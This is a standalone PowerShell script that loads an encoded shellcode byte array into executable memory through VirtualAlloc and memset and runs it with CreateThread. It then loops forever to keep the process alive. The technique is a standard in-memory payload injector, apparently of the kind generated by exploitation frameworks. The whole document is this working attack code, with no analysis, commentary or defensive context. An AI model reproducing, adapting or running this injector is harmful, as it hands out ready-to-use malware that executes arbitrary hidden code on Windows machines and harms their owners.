
$yzVT = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $yzVT -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x95,0x6d,0xb7,0x5c,0xdb,0xc4,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x9a,0x8f,0x42,0xa0,0x4c,0xcd,0xad,0x59,0x8c,0xb2,0x24,0xbc,0xbd,0xf2,0x53,0xb4,0xed,0xc2,0x10,0x98,0x01,0xa8,0x75,0x09,0x92,0xdc,0x51,0x3e,0x13,0x6a,0x84,0x71,0xa4,0xc7,0xf4,0x10,0x26,0x1a,0x29,0xf3,0x17,0xd5,0x3c,0xf2,0x50,0x08,0xcc,0xa6,0x09,0x46,0x63,0x57,0x3e,0x12,0xb8,0xdc,0x0c,0xb2,0xb8,0x01,0xc4,0xb5,0xe9,0x97,0x5f,0xec,0x29,0x19,0x8c,0x84,0x63,0x01,0xd1,0xa1,0x3a,0xba,0x21,0x5d,0xbd,0x6a,0x78,0x9e,0x12,0x53,0xb5,0x6d,0x6a,0x93,0x71,0x8e,0x19,0xed,0x82,0x33,0x1a,0x2a,0xf9,0xef,0xaf,0xa9,0x59,0x7b,0x17,0x16,0x58,0xa8,0xce,0xdd,0x56,0x05,0x84,0xba,0x7a,0x98,0x49,0xb1,0x86,0x11,0x6c,0x16,0x0f,0x61,0x4b,0xb2,0x54,0x31,0xf2,0xe3,0x30,0x94,0x0b,0xf3,0x9b,0x49,0xae,0x7f,0x31,0x9d,0xc3,0xdd,0x5d,0x52,0xee,0xdd,0x9d,0xfc,0x79,0xad,0xaf,0xa3,0xd1,0x39,0x83,0x2c,0xfc,0xbe,0xe4,0x06,0xb8,0x51,0x1b,0xa9,0xb9,0x78,0xdf,0xfd,0xe9,0x12,0xf6,0x7d,0x62,0xe3,0xf7,0xab,0x1f,0xe6,0x6f,0x94,0x48,0xe9,0x42,0x7c,0x8b,0xea,0x9d,0xc7,0x02,0x0c,0xcd,0x67,0x45,0x81,0xad,0xd7,0x25,0x71,0x45,0x32,0xaa,0xae,0x75,0x3d,0x60,0xc7,0x1f,0xd2,0xdd,0xbf,0xb7,0x4b,0x44,0x4b,0x26,0x93,0x52,0x31,0x68,0x1f,0x51,0xc5,0x26,0xe8,0x1c,0xd5,0xde,0x18,0x6b,0x87,0x48,0x26,0x41,0xa2,0x74,0xb2,0x6e,0x65,0x23,0x2a,0x6d,0x50,0x03,0xf5,0x8e,0xb7,0x18,0x3c,0x1b,0x78,0x76,0x41,0xcb,0x78,0x86,0x17,0x81,0x78,0xee,0xcf,0xf1,0x2a,0x0b,0x10,0x2c,0x5f,0x80,0x85,0xcf,0x36,0x75,0x0d,0xb8,0xb4,0xa0,0x79,0x67,0x46,0x87,0x7b,0x5b,0x91,0xe1,0x09,0xb5,0x21;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$h4b=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($h4b.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$h4b,0,0,0);for (;;){Start-sleep 60};

